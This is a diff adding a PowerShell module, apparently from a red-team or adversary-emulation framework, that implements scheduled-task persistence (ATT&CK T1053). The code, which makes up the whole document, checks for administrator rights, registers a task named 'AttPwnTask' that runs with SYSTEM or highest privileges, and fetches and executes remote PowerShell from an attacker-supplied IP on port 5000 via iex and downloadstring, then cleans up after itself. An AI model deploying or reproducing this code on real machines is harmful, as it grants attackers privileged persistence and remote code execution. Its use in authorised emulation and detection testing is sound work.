@@ -1,0 +1,173 @@
+#Title: invoke-scheduleTask
+#Technique: T1053
+#Tactic: TA0003
+
+
+function invoke-scheduleTask
+    {
+        param(
+        [String] $ip
+      )
+
+    <#
+    .SYNOPSIS
+    create a task for launch a new powershell prompt with admin privileges persistence PoC.
+
+    .DESCRIPTION
+    Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)
+
+    .LINK
+
+    https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053/T1053.md#atomic-test-4---powershell-cmdlet-scheduled-task
+    #> 
+    $good = $false
+    $results = $null
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+        { 
+        $versionBuild= [System.Environment]::OSVersion.Version.Build
+          if ($versionBuild –lt 9200)      
+            {
+            $resultados =  w7version
+            $results = $resultados.results
+            $good = $resultados.success
+            }   
+          else
+            {
+            $resultados =  w10version
+            $results = $resultados.results
+            $good = $resultados.success
+            }
+          }
+      else 
+        {
+        $results = "Administrator or System privileges necessary."
+        }
+
+    return @{results=$results | Out-String;success=$good}
+
+    }
+
+function w7version 
+    {    
+      # The name of the scheduled task
+      $TaskName = "AttPwnTask"
+      # The description of the task
+      $TaskDescr = "Run a powershell AttPwnTask"
+      # The Task Action command
+      $uri = "http://" + $ip + ":5000/consola"
+      $TaskCommand = $Env:WinDir+"\system32\windowspowershell\v1.0\powershell.exe"
+      # $TaskArg = "-WindowStyle Hidden -NonInteractive -Executionpolicy unrestricted -command iex(new-object net.webclient).downloadstring('$uri');consola -id $global:id  "
+      $TaskArg = "-command iex(new-object net.webclient).downloadstring('$uri');consola -id $global:id  "
+  
+      # The time when the task starts, for demonstration purposes we run it 1 minute after we created the task
+      $TaskStartTime = [datetime]::Now.AddMinutes(1) 
+      # attach the Task Scheduler com object
+      $service = new-object -ComObject("Schedule.Service")
+      # connect to the local machine. 
+      # http://msdn.microsoft.com/en-us/library/windows/desktop/aa381833(v=vs.85).aspx
+      $service.Connect()
+      $rootFolder = $service.GetFolder("\")
+  
+      $TaskDefinition = $service.NewTask(0) 
+      $TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
+      $TaskDefinition.Settings.Enabled = $true
+      $TaskDefinition.Settings.AllowDemandStart = $true
+  
+      $triggers = $TaskDefinition.Triggers
+      #http://msdn.microsoft.com/en-us/library/windows/desktop/aa383915(v=vs.85).aspx
+      $trigger = $triggers.Create(1) # Creates a "One time" trigger
+      $trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
+      $trigger.Enabled = $true
+  
+      # http://msdn.microsoft.com/en-us/library/windows/desktop/aa381841(v=vs.85).aspx	
+      $Action = $TaskDefinition.Actions.Create(0)
+      $action.Path = "$TaskCommand"
+      $action.Arguments = "$TaskArg"
+      $Action = $TaskDefinition.Actions.Create(0)
+      
+      $delete_function = @" 
+      function invoke-DeleteTask 
+              {
+              # create Task Scheduler COM object
+              `$TS = New-Object -ComObject Schedule.Service
+              # connect to local task sceduler
+              `$TS.Connect(`$env:COMPUTERNAME)
+              # get tasks folder (in this case, the root of Task Scheduler Library)
+              `$TaskFolder = `$TS.GetFolder("\")
+              # get tasks in folder
+              `$Tasks = `$TaskFolder.GetTasks(1)
+              # define name of task to delete
+              `$TaskToDelete = "AttPwnTask"
+              # step through all tasks in the folder
+              foreach(`$Task in `$Tasks)
+                  {
+                  if(`$Task.Name -eq `$TaskToDelete)
+                      {
+                      `$TaskFolder.DeleteTask(`$Task.Name,0)
+                      }
+                  }
+              }
+          if (Test-Path `$Env:SystemDrive"\DeleteTask.txt") 
+              {
+              Remove-Item `$Env:SystemDrive"\DeleteTask.txt"
+              }
+  
+      invoke-DeleteTask
+"@
+      $delete_function > $Env:SystemDrive"\DeleteTask.txt"
+      $TaskArg = "-command iex (Get-Content -Path $Env:SystemDrive\DeleteTask.txt -Raw)"
+      $action.Path = "$TaskCommand"
+      $action.Arguments = "$TaskArg"
+      $results = "Task AttPwnTask create for run at the time " + ($TaskStartTime.ToString("yyyy-MM-dd' T 'HH:mm:ss")) | Out-String  
+      $good = $true
+      #http://msdn.microsoft.com/en-us/library/windows/desktop/aa381365(v=vs.85).aspx
+      $rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)
+  
+    $results = "Task AttPwnTask create for run at the time " + ($TaskStartTime.ToString("yyyy-MM-dd' T 'HH:mm:ss")) | Out-String  
+    $good = $true
+
+    return @{results=$results | Out-String ;success=$good}
+
+    }
+
+
+
+    function w10version 
+      {
+      $time  = (get-date).AddMinutes(1).ToString("HH:mm")
+      $uri = "http://" + $ip + ":5000/consola"
+      $Action = @()
+      $Action += New-ScheduledTaskAction -Execute "$Env:WinDir\system32\windowspowershell\v1.0\powershell.exe" -Argument "-command iex(new-object net.webclient).downloadstring('$uri');consola -id $global:id "
+      $Action += New-ScheduledTaskAction -Execute "$Env:WinDir\system32\windowspowershell\v1.0\powershell.exe" -Argument "-command  Unregister-ScheduledTask  -TaskName 'AttPwnTask'-Confirm:`$false"
+      $Trigger = New-ScheduledTaskTrigger -Once -At $time 
+      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
+      $Set = New-ScheduledTaskSettingsSet
+      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
+      Register-ScheduledTask AttPwnTask -InputObject $object
+      $results = "Task AttPwnTask create for run at the time "  + $time | Out-String  
+      $good = $true
+      
+      return @{results=$results | Out-String;success=$good}
+
+      }
+
+#Main program
+$execute = {
+  
+}
+
+#GiveMeData if needed
+
+#get-credentials
+$execute = invoke-scheduleTask -ip $global:remoteip
+
+#PutData if needed
+  # if($execute.success)
+  # {
+    
+  # }
+
+return @{results=$execute.results | Out-String;success=$execute.success}
+
